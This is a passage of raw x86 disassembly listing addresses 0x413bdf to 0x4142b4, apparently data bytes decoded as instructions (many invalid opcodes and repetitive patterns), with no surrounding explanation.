  413bdf:	xchg   ebx,eax
  413be0:	nop
  413be1:	xchg   esp,eax
  413be2:	mov    bl,0xe0
  413be4:	add    eax,0x596db1
  413be9:	add    BYTE PTR [eax],al
  413beb:	and    eax,0x2d3a211b
  413bf0:	inc    esi
  413bf1:	push   esp
  413bf2:	inc    esi
  413bf3:	sub    eax,0x2121212d
  413bf8:	daa    
  413bf9:	sub    al,0x36
  413bfb:	inc    ebp
  413bfc:	jp     0x413c5e
  413bfe:	gs fs aaa 
  413c01:	cmp    al,0x2f
  413c03:	and    BYTE PTR [edi+ebx*1],bl
  413c06:	sbb    al,0x1f
  413c08:	sbb    al,0x1f
  413c0a:	sbb    al,0x1f
  413c0c:	sbb    al,0x22
  413c0e:	and    ah,BYTE PTR [edx]
  413c10:	sbb    al,0x0
  413c12:	add    al,0x22
  413c14:	add    BYTE PTR [ecx],cl
  413c16:	daa    
  413c17:	daa    
  413c18:	and    DWORD PTR [edi],esp
  413c1a:	daa    
  413c1b:	and    ah,BYTE PTR [edi]
  413c1d:	and    ah,BYTE PTR [edx]
  413c1f:	add    BYTE PTR [edi+ebx*1],al
  413c22:	add    BYTE PTR [edx],ah
  413c24:	and    BYTE PTR [edi],bl
  413c26:	pop    ds
  413c27:	pop    ds
  413c28:	and    ah,BYTE PTR [edi]
  413c2a:	dec    ebx
  413c2b:	inc    esi
  413c2c:	sub    eax,0x2d462d46
  413c31:	inc    esi
  413c32:	dec    ebx
  413c33:	dec    ebx
  413c34:	inc    esi
  413c35:	sub    eax,0x4b4b4646
  413c3a:	dec    esp
  413c3b:	jbe    0x413bd1
  413c3d:	xchg   esp,eax
  413c3e:	(bad)  
  413c3f:	mov    esp,0xfdbb03ba
  413c44:	xchg   DWORD PTR [ebp+0x0],edi
  413c47:	add    BYTE PTR [ecx],al
  413c49:	cmp    al,BYTE PTR [ecx]
  413c4b:	and    DWORD PTR ds:0x31240046,eax
  413c51:	dec    eax
  413c52:	dec    edx
  413c53:	pop    ecx
  413c54:	pop    edx
  413c55:	ins    DWORD PTR es:[edi],dx
  413c56:	cmp    ebp,0xb6b6968c
  413c5c:	ror    BYTE PTR [ecx+0x2f],1
  413c5f:	and    BYTE PTR [eax+eiz*1],bl
  413c62:	pop    ds
  413c63:	pop    ds
  413c64:	sbb    al,0x1f
  413c66:	pop    ds
  413c67:	sbb    al,0x1f
  413c69:	sbb    al,0x1c
  413c6b:	and    bl,BYTE PTR [edx+eiz*1]
  413c6e:	and    ah,BYTE PTR [edi]
  413c70:	and    ah,BYTE PTR [edx]
  413c72:	daa    
  413c73:	cmp    al,BYTE PTR [edi+eiz*1]
  413c76:	add    BYTE PTR [ecx],dl
  413c78:	sbb    esp,DWORD PTR [edx]
  413c7a:	sbb    al,0x1f
  413c7c:	pop    ds
  413c7d:	pop    ds
  413c7e:	and    BYTE PTR [edi],bl
  413c80:	and    BYTE PTR [eax],ah
  413c82:	sbb    al,0x27
  413c84:	cmp    ch,BYTE PTR ds:0x464646
  413c8a:	pop    es
  413c8b:	dec    ebx
  413c8c:	add    BYTE PTR [ecx],dl
  413c8e:	inc    esi
  413c8f:	dec    ebx
  413c90:	inc    esi
  413c91:	inc    esi
  413c92:	dec    ebx
  413c93:	imul   esi,DWORD PTR [esi-0x65],0xb5a4939b
  413c9a:	mov    ch,0xbc
  413c9c:	pop    ecx
  413c9d:	pop    edx
  413c9e:	add    BYTE PTR gs:[eax],al
  413ca1:	add    BYTE PTR [eax],al
  413ca3:	sbb    bh,BYTE PTR [edx]
  413ca5:	inc    esi
  413ca6:	inc    esi
  413ca7:	inc    edi
  413ca8:	dec    edx
  413ca9:	pop    ecx
  413caa:	pop    edx
  413cab:	ins    DWORD PTR es:[edi],dx
  413cac:	std    
  413cad:	xchg   edx,eax
  413cae:	call   0xd8ee:0xc1bbb6a7
  413cb5:	cmc    
  413cb6:	out    0xe6,al
  413cb8:	sbb    BYTE PTR [eax],ah
  413cba:	pop    ds
  413cbb:	sbb    al,0x1c
  413cbd:	pop    ds
  413cbe:	or     BYTE PTR [eax+eax*1],bl
  413cc1:	or     esp,DWORD PTR [edx]
  413cc3:	sbb    esp,DWORD PTR [edi]
  413cc5:	and    ah,BYTE PTR [edx]
  413cc7:	daa    
  413cc8:	and    DWORD PTR [edi],esp
  413cca:	cmp    ah,BYTE PTR [edi]
  413ccc:	daa    
  413ccd:	add    BYTE PTR ds:0x1f0722,al
  413cd3:	pop    ds
  413cd4:	sbb    al,0x21
  413cd6:	cmp    cl,BYTE PTR [ebx+0x46]
  413cd9:	inc    esi
  413cda:	dec    ebx
  413cdb:	inc    esi
  413cdc:	dec    ebx
  413cdd:	dec    ebx
  413cde:	inc    esi
  413cdf:	dec    ebx
  413ce0:	dec    ebx
  413ce1:	inc    esi
  413ce2:	dec    ebx
  413ce3:	inc    esi
  413ce4:	inc    esi
  413ce5:	dec    ebx
  413ce6:	dec    ebx
  413ce7:	dec    esp
  413ce8:	jbe    0x413c7f
  413cea:	xchg   ebp,eax
  413ceb:	(bad)
  413cef:	nop
  413cf0:	bound  ecx,QWORD PTR [edx+0x67]
  413cf3:	add    BYTE PTR [eax],al
  413cf5:	add    BYTE PTR [eax],al
  413cf7:	or     eax,0x634b462d
  413cfc:	xchg   edx,eax
  413cfd:	xchg   edx,eax
  413cfe:	scas   al,BYTE PTR es:[edi]
  413cff:	mov    cl,0xd0
  413d01:	int    0xf7
  413d03:	out    0xe6,al
  413d05:	add    BYTE PTR [esp+ebx*8],al
  413d08:	add    BYTE PTR [ecx],cl
  413d0a:	out    0xe6,al
  413d0c:	out    0x16,al
  413d0e:	pop    ds
  413d0f:	pop    ds
  413d10:	sbb    al,0x1f
  413d12:	pop    ds
  413d13:	add    BYTE PTR [esi],al
  413d15:	sbb    al,0x0
  413d17:	or     al,0x22
  413d19:	daa    
  413d1a:	and    ah,BYTE PTR [edi]
  413d1c:	and    ah,BYTE PTR [edi]
  413d1e:	daa    
  413d1f:	daa    
  413d20:	and    DWORD PTR [edx],edi
  413d22:	daa    
  413d23:	and    DWORD PTR ds:0x41c0122,eax
  413d29:	pop    ds
  413d2a:	add    BYTE PTR [edx],ah
  413d2c:	and    BYTE PTR [edi],bl
  413d2e:	pop    ds
  413d2f:	and    bh,BYTE PTR [edx]
  413d31:	sub    eax,0x4b464b46
  413d36:	inc    esi
  413d37:	dec    ebx
  413d38:	inc    esi
  413d39:	inc    esi
  413d3a:	dec    ebx
  413d3b:	dec    ebx
  413d3c:	dec    ebx
  413d3d:	inc    esi
  413d3e:	inc    esi
  413d3f:	dec    ebx
  413d40:	inc    esi
  413d41:	dec    ebx
  413d42:	popa   
  413d43:	jbe    0x413ce0
  413d45:	fwait
  413d46:	fwait
  413d47:	xchg   esp,eax
  413d48:	fisub  DWORD PTR [esi+0x636463fa]
  413d4e:	add    BYTE PTR [eax],al
  413d50:	add    BYTE PTR [esi+eax*2],cl
  413d53:	inc    esi
  413d54:	dec    ebx
  413d55:	dec    edx
  413d56:	test   eax,0x202dbda
  413d5b:	out    0xe6,al
  413d5d:	out    0x5,al
  413d5f:	fadd   QWORD PTR [eax]
  413d61:	pop    es
  413d62:	cmc    
  413d63:	out    0xdf,al
  413d65:	and    BYTE PTR [esp+ebx*1],bl
  413d68:	pop    ds
  413d69:	add    BYTE PTR [esp+ebx*1],al
  413d6c:	add    DWORD PTR [edx],esp
  413d6e:	add    DWORD PTR [eax*1+0x27080022],ebx
  413d75:	and    ah,BYTE PTR [edi]
  413d77:	daa    
  413d78:	cmp    ah,BYTE PTR [edi]
  413d7a:	daa    
  413d7b:	daa    
  413d7c:	add    al,0x22
  413d7e:	add    DWORD PTR [ecx+eax*1],ebx
  413d81:	and    al,BYTE PTR [edi]
  413d83:	pop    ds
  413d84:	add    BYTE PTR [eax],ah
  413d86:	sbb    esp,DWORD PTR [edi]
  413d88:	cmp    al,BYTE PTR [esi+0x4b]
  413d8b:	inc    esi
  413d8c:	dec    ebx
  413d8d:	dec    ebx
  413d8e:	inc    esi
  413d8f:	dec    ebx
  413d90:	inc    esi
  413d91:	inc    esi
  413d92:	dec    ebx
  413d93:	inc    esi
  413d94:	dec    ebx
  413d95:	sub    eax,0x4b2d4b46
  413d9a:	dec    esp
  413d9b:	jbe    0x413d38
  413d9d:	nop
  413d9e:	jbe    0x413d26
  413da0:	test   DWORD PTR [edx],0x7d5a7dfb
  413da6:	add    BYTE PTR [eax],al
  413da8:	add    BYTE PTR [edi],dl
  413daa:	dec    ebx
  413dab:	push   esp
  413dac:	sub    eax,0xf0d79a3e
  413db1:	add    ah,ch
  413db3:	out    0xe6,al
  413db5:	(bad)  
  413db7:	fld    QWORD PTR [ebx*8+0xee6e6dd]
  413dbe:	push   ss
  413dbf:	sbb    al,0x1f
  413dc1:	add    BYTE PTR [esp+ebx*1],al
  413dc4:	add    BYTE PTR [ecx],dl
  413dc6:	and    bl,BYTE PTR [edx+eiz*1]
  413dc9:	sbb    esp,DWORD PTR [edi]
  413dcb:	daa    
  413dcc:	and    ah,BYTE PTR [edi]
  413dce:	sbb    esp,DWORD PTR [edi]
  413dd0:	daa    
  413dd1:	and    DWORD PTR [edi],esp
  413dd3:	daa    
  413dd4:	daa    
  413dd5:	and    ah,BYTE PTR [edx]
  413dd7:	add    BYTE PTR ds:0x51c011f,al
  413ddd:	pop    ds
  413dde:	add    BYTE PTR [esi],cl
  413de0:	sbb    al,0x27
  413de2:	daa    
  413de3:	dec    ebx
  413de4:	dec    ebx
  413de5:	inc    esi
  413de6:	dec    ebx
  413de7:	inc    esi
  413de8:	inc    esi
  413de9:	dec    ebx
  413dea:	inc    esi
  413deb:	dec    ebx
  413dec:	inc    esi
  413ded:	inc    esi
  413dee:	add    eax,0x460e004b
  413df3:	dec    ebx
  413df4:	data16 jnp 0x413d8a
  413df7:	nop
  413df8:	das    
  413df9:	js     0x413e06
  413dfb:	or     ebx,edi
  413dfd:	ins    DWORD PTR es:[edi],dx
  413dfe:	pop    edi
  413dff:	arpl   WORD PTR [eax],ax
  413e01:	add    BYTE PTR [eax],al
  413e03:	and    DWORD PTR [esi+0x4b],eax
  413e06:	sub    eax,0xf1d9fe48
  413e0b:	icebp  
  413e0c:	out    0xf5,al
  413e0e:	fstp   st(4)
  413e10:	fld    QWORD PTR [esp+ebp*8]
  413e13:	fucom  st(6)
  413e15:	fdivr  st(1),st
  413e17:	push   cs
  413e18:	push   ss
  413e19:	sbb    al,0x1f
  413e1b:	sbb    al,0x22
  413e1d:	sbb    al,0x1c
  413e1f:	and    ah,BYTE PTR [edx]
  413e21:	and    ah,BYTE PTR [edi]
  413e23:	sbb    esp,DWORD PTR [edx]
  413e25:	add    BYTE PTR [esi],al
  413e27:	daa    
  413e28:	add    BYTE PTR [eax],cl
  413e2a:	and    ah,BYTE PTR [edx]
  413e2c:	pop    ds
  413e2d:	and    BYTE PTR [eax],ah
  413e2f:	pop    ds
  413e30:	pop    ds
  413e31:	and    BYTE PTR [edi+ebx*1],al
  413e34:	add    BYTE PTR ds:0x1f201f20,ah
  413e3a:	and    ah,BYTE PTR [edi]
  413e3c:	cmp    cl,BYTE PTR [ebx+0x46]
  413e3f:	dec    ebx
  413e40:	push   esp
  413e41:	dec    ebx
  413e42:	dec    ebx
  413e43:	inc    esi
  413e44:	dec    ebx
  413e45:	inc    esi
  413e46:	dec    ebx
  413e47:	inc    esi
  413e48:	inc    esi
  413e49:	dec    ebx
  413e4a:	inc    esi
  413e4b:	inc    esi
  413e4c:	dec    ebx
  413e4d:	dec    ebx
  413e4e:	push   esp
  413e4f:	popa   
  413e50:	pop    ebp
  413e51:	xchg   ecx,eax
  413e52:	sahf   
  413e53:	xchg   ecx,eax
  413e54:	mov    ebp,0x5afb060e
  413e59:	pop    ecx
  413e5a:	arpl   WORD PTR [eax],ax
  413e5c:	add    BYTE PTR [eax],al
  413e5e:	add    BYTE PTR [esi+eax*2],dl
  413e61:	cmp    bh,BYTE PTR [edx]
  413e63:	xor    esi,edi
  413e65:	int    0xe6
  413e67:	out    0xdd,al
  413e69:	add    al,0xf8
  413e6b:	add    al,0x4
  413e6d:	fstp   st(5)
  413e6f:	fsubr  st(6),st
  413e71:	out    0xf1,al
  413e73:	push   cs
  413e74:	add    eax,0x2207001c
  413e79:	and    bl,BYTE PTR [esp+ebx*1]
  413e7c:	and    ah,BYTE PTR [edx]
  413e7e:	daa    
  413e7f:	add    BYTE PTR [edx+eiz*1],al
  413e82:	add    BYTE PTR [esi],bl
  413e84:	sbb    al,0x22
  413e86:	and    BYTE PTR [eax],ah
  413e88:	sbb    eax,0x231d3b1d
  413e8d:	and    esp,DWORD PTR [eax]
  413e8f:	and    BYTE PTR [eax],ah
  413e91:	pop    ds
  413e92:	and    BYTE PTR [edi],bl
  413e94:	and    BYTE PTR [eax],ah
  413e96:	pop    ds
  413e97:	daa    
  413e98:	and    DWORD PTR [ebx+0x4b],ecx
  413e9b:	inc    esi
  413e9c:	dec    ebx
  413e9d:	dec    ebx
  413e9e:	push   esp
  413e9f:	dec    ebx
  413ea0:	dec    ebx
  413ea1:	dec    ebx
  413ea2:	push   es
  413ea3:	inc    esi
  413ea4:	add    al,0x4b
  413ea6:	add    BYTE PTR [esi+ecx*2],cl
  413ea9:	outs   dx,BYTE PTR ds:[esi]
  413eaa:	push   0xffffff9e
  413eac:	mov    eax,ds:0xf7dac191
  413eb1:	or     eax,0x94d0
  413eb6:	add    BYTE PTR [edi],ch
  413eb8:	cmp    ch,BYTE PTR ds:0xd157211b
  413ebe:	fadd   QWORD PTR [eax+edi*8]
  413ec1:	add    al,0xcf
  413ec3:	add    al,0xdd
  413ec5:	fstp   st(4)
  413ec7:	out    0xe6,al
  413ec9:	in     eax,0xf1
  413ecb:	push   cs
  413ecc:	push   ss
  413ecd:	pop    ds
  413ece:	sbb    al,0x1f
  413ed0:	and    bl,BYTE PTR [esp+ebx*1]
  413ed3:	sbb    al,0x1f
  413ed5:	and    bl,BYTE PTR [edx+eiz*1]
  413ed8:	and    ah,BYTE PTR [edx]
  413eda:	pop    ds
  413edb:	and    BYTE PTR [ebx],ah
  413edd:	sbb    eax,0x2e562e2f
  413ee2:	cs das 
  413ee4:	and    esp,DWORD PTR [ebx]
  413ee6:	and    eax,DWORD PTR [eax]
  413ee8:	push   es
  413ee9:	and    BYTE PTR [eax],al
  413eeb:	and    ebx,DWORD PTR [edi]
  413eed:	sbb    al,0x21
  413eef:	sub    eax,0x464b4646
  413ef4:	inc    esi
  413ef5:	dec    ebx
  413ef6:	dec    ebx
  413ef7:	inc    esi
  413ef8:	inc    esi
  413ef9:	sub    eax,0x4b4b4646
  413efe:	inc    esi
  413eff:	dec    ebx
  413f00:	dec    ebx
  413f01:	dec    ebx
  413f02:	sub    eax,0x996a565b
  413f07:	cwde   
  413f08:	out    dx,eax
  413f09:	out    dx,eax
  413f0a:	rol    BYTE PTR [ebx],0x9
  413f0d:	mov    ds:0xa1,eax
  413f12:	add    BYTE PTR [edx],bh
  413f14:	and    DWORD PTR [ecx],esp
  413f16:	sbb    ebp,DWORD PTR [eax]
  413f18:	pop    edx
  413f19:	cli    
  413f1a:	(bad)  
  413f1c:	iret   
  413f1d:	iret   
  413f1e:	add    al,0xdd
  413f20:	(bad)  
  413f22:	out    0xe6,al
  413f24:	icebp  
  413f25:	icebp  
  413f26:	icebp  
  413f27:	push   cs
  413f28:	push   ss
  413f29:	sbb    al,0x1f
  413f2b:	pop    ds
  413f2c:	sbb    al,0x1c
  413f2e:	pop    ds
  413f2f:	pop    ds
  413f30:	sbb    al,0x1f
  413f32:	sbb    al,0x1f
  413f34:	and    BYTE PTR [ebx],ah
  413f36:	sbb    eax,0x554f4d2e
  413f3b:	dec    edi
  413f3c:	push   ebp
  413f3d:	cs cs das 
  413f40:	sbb    eax,0x20232323
  413f45:	and    esp,DWORD PTR [eax]
  413f47:	and    esp,DWORD PTR [eax]
  413f49:	and    BYTE PTR [ecx+eiz*1],bl
  413f4c:	dec    ebx
  413f4d:	sub    eax,0x19004605
  413f52:	dec    ebx
  413f53:	dec    ebx
  413f54:	dec    ebx
  413f55:	push   esp
  413f56:	dec    ebx
  413f57:	inc    esi
  413f58:	inc    esi
  413f59:	dec    ebx
  413f5a:	dec    ebx
  413f5b:	inc    esi
  413f5c:	sub    eax,0x6a3b464b
  413f61:	push   esi
  413f62:	jno    0x413efc
  413f64:	mov    esp,DWORD PTR [esi]
  413f66:	cli    
  413f67:	ror    BYTE PTR ds:0xb2b2,1
  413f6d:	add    BYTE PTR [eax],al
  413f6f:	push   ss
  413f70:	sbb    esp,DWORD PTR [ecx]
  413f72:	sbb    edi,DWORD PTR [ebx]
  413f74:	pop    edi
  413f75:	sti    
  413f76:	or     al,0xcf
  413f78:	iret   
  413f79:	add    al,0x4
  413f7b:	fsubr  st(6),st
  413f7d:	out    0xf1,al
  413f7f:	icebp  
  413f80:	add    al,BYTE PTR [edx]
  413f82:	repnz push cs
  413f84:	sbb    al,0x1c
  413f86:	add    eax,0x2915001f
  413f8b:	and    BYTE PTR [esi+0x3b],cl
  413f8e:	cs cmp eax,0x2b534f55
  413f94:	sub    ebp,DWORD PTR [ebx]
  413f96:	outs   dx,BYTE PTR ds:[esi]
  413f97:	jno    0x413ff6
  413f99:	pop    eax
  413f9a:	sbb    DWORD PTR ds:0x334e33,esi
  413fa0:	add    eax,0x20030023
  413fa5:	daa    
  413fa6:	cmp    al,BYTE PTR [eax]
  413fa8:	add    al,0x4b
  413faa:	or     al,0x46
  413fac:	add    BYTE PTR [eax],dl
  413fae:	dec    ebx
  413faf:	inc    esi
  413fb0:	inc    esi
  413fb1:	inc    esi
  413fb2:	pop    ebx
  413fb3:	push   esi
  413fb4:	push   0x6a
  413fb6:	xchg   ecx,eax
  413fb7:	sahf   
  413fb8:	mov    esp,DWORD PTR [ecx+0x5e]
  413fbb:	outs   dx,DWORD PTR ds:[esi]
  413fbc:	(bad)  
  413fbd:	xchg   esp,eax
  413fbe:	add    BYTE PTR [eax],al
  413fc0:	add    BYTE PTR [ecx*2-0x4c3b1dd],cl
  413fc7:	xchg   bh,cl
  413fc9:	iret   
  413fca:	add    al,0x4
  413fcc:	out    0xe6,al
  413fce:	add    al,0xf1
  413fd0:	add    BYTE PTR [esi],cl
  413fd2:	add    al,BYTE PTR [edx]
  413fd4:	icebp  
  413fd5:	or     esi,DWORD PTR [esi]
  413fd7:	inc    eax
  413fd8:	inc    eax
  413fd9:	pop    edi
  413fda:	pop    edi
  413fdb:	pop    ecx
  413fdc:	pop    edi
  413fdd:	pop    edi
  413fde:	inc    ebp
  413fdf:	es add al,0x7c
  413fe2:	add    al,0x72
  413fe4:	add    BYTE PTR [eax+edi*2],dl
  413fe7:	jbe    0x413f71
  413fe9:	ins    BYTE PTR es:[edi],dx
  413fea:	gs jg  0x413f6d
  413fed:	gs fs fs pop edi
  413ff1:	pop    edi
  413ff2:	arpl   WORD PTR [eax+0x36],ax
  413ff5:	xor    ah,BYTE PTR [edi]
  413ff7:	dec    ebx
  413ff8:	dec    ebx
  413ff9:	dec    ebx
  413ffa:	or     BYTE PTR [esi+0x0],al
  413ffd:	push   ss
  413ffe:	dec    ebx
  413fff:	dec    ebx
  414000:	dec    ebx
  414001:	inc    esi
  414002:	inc    esi
  414003:	inc    esi
  414004:	dec    ebx
  414005:	inc    esi
  414006:	dec    ebx
  414007:	dec    ebx
  414008:	dec    esi
  414009:	push   0x56
  41400b:	push   esi
  41400c:	adc    BYTE PTR [ebx+0x66769097],0x8f
  414013:	fwait
  414014:	add    BYTE PTR [eax],al
  414016:	add    BYTE PTR [edx],cl
  414018:	sub    edi,DWORD PTR [edx*2-0x3079d9e2]
  41401f:	add    al,0xdd
  414021:	cmc    
  414022:	add    eax,0x20d00f1
  414027:	icebp  
  414028:	lock icebp 
  41402a:	or     eax,0x19201fd
  41402f:	add    esi,edi
  414031:	ins    BYTE PTR es:[edi],dx
  414032:	add    DWORD PTR [eax],0x4
  414035:	jb     0x414037
  414037:	push   ds
  414038:	js     0x4140b2
  41403a:	jb     0x4140b4
  41403c:	jb     0x4140b6
  41403e:	jns    0x413fc4
  414040:	ins    BYTE PTR es:[edi],dx
  414041:	jae    0x413fcc
  414043:	xchg   DWORD PTR [esi-0x6d717102],ecx
  414049:	xchg   edx,eax
  41404a:	xchg   edx,eax
  41404b:	std    
  41404c:	jge    0x4140ad
  41404e:	pop    edi
  41404f:	fs pop edx
  414051:	gs fs pop edx
  414054:	pop    ecx
  414055:	pop    edx
  414056:	add    eax,0x4a150059
  41405b:	dec    edx
  41405c:	push   edx
  41405d:	push   esp
  41405e:	inc    esi
  41405f:	inc    esi
  414060:	dec    ebx
  414061:	dec    ebx
  414062:	inc    esi
  414063:	cmp    edx,DWORD PTR [esi+0x5d]
  414066:	pop    ebx
  414067:	pop    ebx
  414068:	jbe    0x413ff9
  41406a:	xchg   ebp,eax
  41406b:	xchg   esp,eax
  41406c:	xchg   ebx,eax
  41406d:	xchg   esp,eax
  41406e:	fwait
  41406f:	add    BYTE PTR [eax],al
  414071:	add    BYTE PTR [eax],al
  414073:	pop    eax
  414074:	push   eax
  414075:	push   ebp
  414076:	cmp    al,0x4d
  414078:	cmp    eax,0xf5f8142b
  41407d:	out    0xe5,al
  41407f:	icebp  
  414080:	icebp  
  414081:	icebp  
  414082:	lock icebp 
  414084:	lock icebp 
  414086:	icebp  
  414087:	mov    bl,0x1
  414089:	mov    ?,ebp
  41408b:	xchg   edx,eax
  41408c:	mov    WORD PTR [ebp+0x727c9978],es
  414092:	jb     0x414106
  414094:	js     0x41410e
  414096:	jb     0x41410a
  414098:	js     0x414024
  41409a:	ins    BYTE PTR es:[edi],dx
  41409b:	fs jg  0x41402a
  41409e:	mov    cs,WORD PTR [esi-0x71717102]
  4140a4:	cld    
  4140a5:	mov    ss,WORD PTR [edx-0x7f7f7672]
  4140ab:	inc    BYTE PTR [ecx]
  4140ad:	xchg   edx,eax
  4140ae:	add    ebp,edi
  4140b0:	add    DWORD PTR [edx-0x6d6dfe03],edx
  4140b6:	std    
  4140b7:	add    DWORD PTR [edx+0x595a8c8e],edx
  4140bd:	dec    edx
  4140be:	push   edx
  4140bf:	inc    esi
  4140c0:	pop    ebx
  4140c1:	pop    ebp
  4140c2:	pop    ebx
  4140c3:	popa   
  4140c4:	data16 imul cx,WORD PTR [edx-0x6b6b6b71],0x0
  4140ce:	add    BYTE PTR [ebx+eax*4],bl
  4140d1:	js     0x414141
  4140d3:	dec    ebp
  4140d4:	pop    ss
  4140d5:	push   ebp
  4140d6:	push   ebp
  4140d7:	dec    edi
  4140d8:	push   ds
  4140d9:	adc    al,0x14
  4140db:	adc    DWORD PTR [eax],ecx
  4140dd:	rol    DWORD PTR [esi],0x2
  4140e0:	icebp  
  4140e1:	lock lock mov ebx,0x81928e01
  4140e8:	xchg   BYTE PTR [edx+0x7c],dh
  4140eb:	jb     0x4140f1
  4140ed:	js     0x4140ef
  4140ef:	or     esi,DWORD PTR [edx+0x78]
  4140f2:	cmp    DWORD PTR [edx+0x74],0x7f
  4140f6:	xchg   DWORD PTR [esi+0xfd8e92],ecx
  4140fc:	add    al,0x8e
  4140fe:	add    BYTE PTR [ebx],ah
  414100:	std    
  414101:	mov    cs,WORD PTR [esi-0x76780172]
  414107:	mov    DWORD PTR [esi-0x6d6d027f],ecx
  41410d:	mov    ?,ebp
  41410f:	xchg   edx,eax
  414110:	mov    ss,WORD PTR [edx+0x192fdfd]
  414116:	xchg   edx,eax
  414117:	add    DWORD PTR [edx+0x7e87fdfd],edx
  41411d:	pop    esp
  41411e:	popa   
  41411f:	data16 data16 imul ax,WORD PTR [eax],0x6804
  414126:	add    edx,edi
  414128:	add    DWORD PTR [ebp+0x7000000],esi
  41412e:	in     al,0x84
  414130:	aas    
  414131:	cmp    al,0x3d
  414133:	pop    ss
  414134:	dec    edi
  414135:	add    BYTE PTR ds:0x762e0055,al
  41413b:	mov    ch,bh
  41413d:	in     al,dx
  41413e:	fdivr  st(5),st
  414140:	cmc    
  414141:	mov    esp,0x858101fd
  414146:	jl     0x4141ba
  414148:	js     0x4141c2
  41414a:	js     0x4140e5
  41414c:	js     0x4141c7
  41414e:	cmp    DWORD PTR [edx-0x73],0xffffff8e
  414152:	std    
  414153:	std    
  414154:	xchg   edx,eax
  414155:	xchg   edx,eax
  414156:	xchg   edx,eax
  414157:	std    
  414158:	cmp    ebp,0x8e928efd
  41415e:	std    
  41415f:	mov    ss,WORD PTR [edx-0x78737103]
  414165:	mov    ?,ebp
  414167:	xchg   edx,eax
  414168:	add    al,0xfd
  41416a:	add    BYTE PTR [edx],dl
  41416c:	mov    ?,ebp
  41416e:	xchg   edx,eax
  41416f:	xchg   edx,eax
  414170:	mov    ?,ebp
  414172:	mov    ?,ebp
  414174:	mov    ?,ebp
  414176:	xchg   edx,eax
  414177:	xchg   edx,eax
  414178:	std    
  414179:	xchg   edx,eax
  41417a:	pop    esi
  41417b:	data16 imul ax,WORD PTR [eax+ebp*2],0x400
  414182:	imul   ebp,DWORD PTR [eax-0x3e],0xba
  414189:	push   es
  41418a:	fdivr  QWORD PTR [ebp+0x4f3c4983]
  414190:	add    al,0x55
  414192:	add    BYTE PTR [esi],bl
  414194:	dec    edi
  414195:	dec    edi
  414196:	mov    ecx,DWORD PTR [edx-0x131e131c]
  41419c:	in     al,dx
  41419d:	stc    
  41419e:	shr    DWORD PTR [eax+0x7872729f],0x78
  4141a5:	js     0x414219
  4141a7:	jns    0x414131
  4141a9:	ins    BYTE PTR es:[edi],dx
  4141aa:	jae    0x414138
  4141ac:	std    
  4141ad:	std    
  4141ae:	std    
  4141af:	xchg   edx,eax
  4141b0:	xchg   edx,eax
  4141b1:	std    
  4141b2:	add    al,0x8e
  4141b4:	add    al,0xfd
  4141b6:	add    DWORD PTR [esi-0x71f902ff],ecx
  4141bc:	add    BYTE PTR [eax],cl
  4141be:	xchg   edx,eax
  4141bf:	std    
  4141c0:	xchg   edx,eax
  4141c1:	xchg   edx,eax
  4141c2:	std    
  4141c3:	mov    ?,ebp
  4141c5:	mov    es,WORD PTR [edi*8-0x6d6dec00]
  4141cc:	std    
  4141cd:	xchg   edx,eax
  4141ce:	mov    ss,WORD PTR [edx+0x66628781]
  4141d4:	imul   ebp,DWORD PTR [eax+0x69],0x69686868
  4141db:	imul   edx,ecx,0x5
  4141e1:	push   ss
  4141e2:	pop    es
  4141e3:	stc    
  4141e4:	xchg   BYTE PTR [ecx+0x3c],bh
  4141e7:	push   ebp
  4141e8:	dec    ebp
  4141e9:	pop    ss
  4141ea:	push   ebp
  4141eb:	push   ebp
  4141ec:	cmp    al,0x6e
  4141ee:	add    DWORD PTR [ebx-0x1d131367],0xffffffe2
  4141f5:	clc    
  4141f6:	in     al,dx
  4141f7:	loop   0x4141ff
  4141f9:	js     0x4141fb
  4141fb:	xor    cl,BYTE PTR [eax-0x71be80a0]
  414201:	xchg   edx,eax
  414202:	xchg   edx,eax
  414203:	std    
  414204:	xchg   edx,eax
  414205:	std    
  414206:	mov    ss,WORD PTR [edx-0x6d6d6d03]
  41420c:	mov    ss,WORD PTR [edx-0x6d6d0272]
  414212:	std    
  414213:	xchg   edx,eax
  414214:	xchg   edx,eax
  414215:	std    
  414216:	mov    ?,ebp
  414218:	xchg   edx,eax
  414219:	mov    ?,ebp
  41421b:	mov    ?,ebp
  41421d:	std    
  41421e:	mov    ?,ebp
  414220:	xchg   edx,eax
  414221:	mov    ?,ebp
  414223:	mov    ?,ebp
  414225:	mov    ss,WORD PTR [edx-0x6d02716e]
  41422b:	xor    DWORD PTR [esi+0x66],0x5006905
  414232:	imul   bp,WORD PTR [ecx+0xd],0xb8
  414238:	add    BYTE PTR [eax],al
  41423a:	add    BYTE PTR [ecx-0x24],dl
  41423d:	fsub   st(7),st
  41423f:	mov    dl,BYTE PTR [eax+0x55]
  414242:	push   ebp
  414243:	dec    edi
  414244:	dec    edi
  414245:	push   ebp
  414246:	cmp    al,0x71
  414248:	outs   dx,DWORD PTR ds:[esi]
  414249:	and    ebx,0xffffffe1
  41424c:	in     al,dx
  41424d:	in     al,dx
  41424e:	fsubr  st(1),st
  414250:	fsub   st(5),st
  414252:	mov    ecx,DWORD PTR [ebx+0x74837878]
  414258:	inc    ecx
  414259:	(bad)  
  41425a:	xchg   edx,eax
  41425b:	mov    ?,ebp
  41425d:	mov    ?,ebp
  41425f:	xchg   edx,eax
  414260:	xchg   edx,eax
  414261:	xchg   edx,eax
  414262:	std    
  414263:	std    
  414264:	mov    ?,ebp
  414266:	mov    ?,ebp
  414268:	xchg   edx,eax
  414269:	std    
  41426a:	std    
  41426b:	xchg   edx,eax
  41426c:	xchg   edx,eax
  41426d:	xchg   edx,eax
  41426e:	std    
  41426f:	mov    ?,ebp
  414271:	mov    ?,ebp
  414273:	xchg   edx,eax
  414274:	std    
  414275:	xchg   edx,eax
  414276:	std    
  414277:	std    
  414278:	mov    ?,ebp
  41427a:	std    
  41427b:	std    
  41427c:	mov    ?,ebp
  41427e:	mov    ss,WORD PTR [edx-0x6d6d0203]
  414284:	std    
  414285:	adc    DWORD PTR [edx+0x5b6e7cfe],0x4007561
  41428f:	data16 add BYTE PTR [ebx],al
  414292:	imul   ebx,edx,0x5
  414298:	add    BYTE PTR [eax+0x8],bl
  41429b:	(bad)  
  41429d:	xchg   ecx,eax
  41429e:	xor    DWORD PTR [edi],0x77
  4142a1:	dec    ebp
  4142a2:	dec    edi
  4142a3:	dec    ebp
  4142a4:	and    al,0x78
  4142a6:	test   DWORD PTR [eax-0x19270a12],ecx
  4142ac:	fdivrp st(5),st
  4142ae:	cmc    
  4142af:	in     al,0x83
  4142b1:	sub    DWORD PTR [ebx],0x37
  4142b4:	jae    0x4142b7
